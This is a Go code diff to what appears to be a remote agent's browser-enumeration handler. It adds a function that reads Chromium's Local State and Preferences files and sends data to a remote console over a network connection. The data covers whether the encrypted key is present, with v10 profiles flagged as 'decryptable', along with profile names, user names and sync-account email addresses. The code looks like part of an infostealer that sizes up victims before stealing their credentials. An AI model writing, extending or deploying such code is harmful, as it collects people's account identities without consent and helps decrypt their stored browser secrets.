@@ -19,6 +19,7 @@ import (
 // Row format: kind \t browser \t profile \t b \t c \t size
 //   F  file artifact (b=name, c=mtime)   V  version (b=version)
 //   B  bookmark (b=name, c=url)          E  extension (b=id, c=version)
+//   P  profile identity (b=field, c=value)   K  crypto/keyring summary
 
 type browserRoot struct {
 	name    string
@@ -109,6 +110,7 @@ func handleBrowser(c net.Conn) {
 					bLine(c, "V", br.name, "-", s, "0", 0, "")
 				}
 			}
+			keySummary(c, br)
 		}
 	}
 	_ = writeFrame(c, protocol.RspEnd, nil)
@@ -191,4 +193,65 @@ func sanitize(s string) string {
 		}
 		return r
 	}, s)
+}
+
+// keySummary reports the Chromium crypto scheme (so the console can tell a
+// decryptable v10 profile from a v20 app-bound one) and the profile identities
+// stored in Local State / Preferences.
+func keySummary(c net.Conn, br browserRoot) {
+	localState := filepath.Join(br.path, "Local State")
+	if b, err := os.ReadFile(localState); err == nil && len(b) < 8<<20 {
+		var st struct {
+			OSCrypt struct {
+				EncryptedKey string `json:"encrypted_key"`
+			} `json:"os_crypt"`
+			Profile struct {
+				InfoCache map[string]struct {
+					Name     string `json:"name"`
+					UserName string `json:"user_name"`
+				} `json:"info_cache"`
+			} `json:"profile"`
+		}
+		if json.Unmarshal(b, &st) == nil {
+			scheme := "plaintext/unknown"
+			if st.OSCrypt.EncryptedKey != "" {
+				scheme = "v10 (可解密)"
+			}
+			bLine(c, "K", br.name, "-", "os_crypt", scheme, 0, localState)
+			bLine(c, "K", br.name, "-", "profiles", strconv.Itoa(len(st.Profile.InfoCache)), 0, localState)
+			for prof, info := range st.Profile.InfoCache {
+				if info.Name != "" {
+					bLine(c, "P", br.name, sanitize(prof), "名称", sanitize(info.Name), 0, localState)
+				}
+				if info.UserName != "" {
+					bLine(c, "P", br.name, sanitize(prof), "账户", sanitize(info.UserName), 0, localState)
+				}
+			}
+		}
+	}
+	for _, prof := range chromiumProfiles(br) {
+		prefs := filepath.Join(prof, "Preferences")
+		b, err := os.ReadFile(prefs)
+		if err != nil || len(b) > 8<<20 {
+			continue
+		}
+		var p struct {
+			Profile struct {
+				Name        string `json:"name"`
+				AccountInfo []struct {
+					Email string `json:"email"`
+				} `json:"account_info"`
+			} `json:"profile"`
+		}
+		if json.Unmarshal(b, &p) != nil {
+			continue
+		}
+		name := sanitize(filepath.Base(prof))
+		if p.Profile.Name != "" {
+			bLine(c, "P", br.name, name, "配置名", sanitize(p.Profile.Name), 0, prefs)
+		}
+		if len(p.Profile.AccountInfo) > 0 && p.Profile.AccountInfo[0].Email != "" {
+			bLine(c, "P", br.name, name, "同步账户", sanitize(p.Profile.AccountInfo[0].Email), 0, prefs)
+		}
+	}
 }
